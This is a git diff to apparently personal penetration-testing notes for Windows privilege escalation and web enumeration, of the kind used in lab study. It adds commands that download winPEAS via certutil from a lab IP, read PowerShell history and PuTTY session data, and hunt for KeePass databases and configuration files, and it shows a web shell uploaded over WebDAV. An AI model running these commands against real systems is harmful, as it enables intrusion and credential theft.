@@ -11,24 +11,36 @@ platform:platform
 
 # Windows
 
+## Enumeration
+```bash
+> whoami /priv
+> systeminfo(OS NAME, OS VERSION)
+> certutil -urlcache -f http://192.168.45.176/winPEAS.exe winPEAS.exe
+> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+
+# Modifiable services/executables
+> sc qc service
+
+# Scheduled tasks
+> schtasks /query /fo LIST /v
+
+# Search for juicy files
+> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+> type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+> Get-History
+> (Get-PSReadlineOption).HistorySavePath
+> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+
 ## Code Snippet to check where our code is executed
 ```bash
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 (dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
 ```
 
-## juicy files 
-```bash
-> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-> type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-> Get-History
-> (Get-PSReadlineOption).HistorySavePath
-
-> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
-
-```
 
 # HTTP/HTTPS(80,8080,8000,443...)
 
@@ -43,7 +55,6 @@ gobuster dir -u http://192.168.216.122/ -w /usr/share/wordlists/dirbuster/direct
 ```bash
 └─# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.216.10/ -x php,aspx,jsp,pdf -C 404,401,403 -k
 ```
-
 
 
 ## nikto: find webdav, other vuln
@@ -62,6 +73,10 @@ cadaver http://10.3.20.218/webdav
 put /root/offsec/shell.aspx
 ```
 
+## exiftool
+```bash
+exiftool -a -u brochure.pdf
+```
 
 ## wpscan: wordpress
 ```bash
